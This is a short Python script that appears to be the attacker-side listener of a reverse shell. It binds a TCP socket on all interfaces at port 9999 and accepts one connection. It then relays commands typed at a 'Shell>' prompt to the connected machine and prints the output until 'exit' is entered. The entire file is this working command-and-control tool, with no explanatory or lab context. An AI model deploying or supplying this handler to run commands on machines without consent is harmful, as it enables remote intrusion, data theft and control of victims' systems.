import socket

def start_listener(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"[+] Listening on {host}:{port}")
        
        conn, addr = server_socket.accept()
        print(f"[+] Connection established with {addr}")
        
        while True:
            command = input("Shell> ")  
            if command.lower() in ["exit", "quit"]:
                conn.send(b"exit")
                print("[+] Connection closed.")
                break
            
            conn.send(command.encode())
            response = conn.recv(4096).decode()  
            print(response)

if __name__ == "__main__":
    host = "0.0.0.0"  
    port = 9999
    start_listener(host, port)
